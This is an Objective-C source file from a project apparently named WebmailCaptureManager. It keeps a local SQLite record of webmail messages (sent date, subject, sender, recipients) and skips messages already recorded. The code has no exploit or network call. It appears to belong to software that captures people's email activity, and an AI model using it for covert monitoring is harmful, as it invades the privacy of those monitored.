//
//  WebmailChecker.m
//  WebmailCaptureManager
//
//  Created by Makara Khloth on 2/19/15.
//  Copyright (c) 2015 ophat. All rights reserved.
//

#import "WebmailChecker.h"

#import "FMDatabase.h"
#import "FMResultSet.h"

@interface WebmailChecker (private)
- (void) setupDatabase;
@end

@implementation WebmailChecker

@synthesize mLocker;

- (id) initWithDatabaseFolder: (NSString *) aDatabaseFolder {
    self = [super init];
    if (self) {
        mLocker = [[NSLock alloc] init];
        mDatabaseFolder = [aDatabaseFolder retain];
        [self setupDatabase];
    }
    return (self);
}

- (void) clearWebmail {
    [self.mLocker lock];
    [mDatabase executeUpdate:@"delete from webmail"];
    [self.mLocker unlock];
}

- (BOOL) isWebmailCheckInAndCheckInIfNecessary: (NSDictionary *) aWebmailInfo {
    [self.mLocker lock];
    
    NSString *sentDate = [aWebmailInfo objectForKey:@"sent-date"];
    NSString *subject = [aWebmailInfo objectForKey:@"subject"];
    NSString *senderEmail = [aWebmailInfo objectForKey:@"sender-email"];
    NSArray *receiverEmails = [aWebmailInfo objectForKey:@"receiver-emails"];
    NSString *receiverEmailsString = [receiverEmails componentsJoinedByString:@";"];
    
    FMResultSet *rs = [mDatabase executeQuery:@"select * from webmail where subject = ? and sender_email = ? and receiver_emails = ? and sent_date = ?", subject,senderEmail,receiverEmailsString,sentDate];
    
    BOOL checkIn = NO;
    if ([rs next]) {
        checkIn = YES;
    } else {
        [mDatabase executeUpdate:@"insert into webmail values(NULL, ?, ?, ?, ?)", sentDate, subject, senderEmail, receiverEmailsString];
    }
    
    [self.mLocker unlock];
    
    return checkIn;
}

- (void) setupDatabase {
    NSString *dbPath = [NSString stringWithFormat:@"%@%@", mDatabaseFolder, @"webmailchecker.db"];
    mDatabase = [[FMDatabase databaseWithPath:dbPath] retain];
    [mDatabase open];
    
    [mDatabase executeUpdate:@"create table if not exists webmail (id integer primary key autoincrement, sent_date text, "
                                    "subject text, sender_email text, receiver_emails text)"];
}

- (void) dealloc {
    [mLocker release];
    [mDatabase close];
    [mDatabase release];
    [mDatabaseFolder release];
    [super dealloc];
}

@end
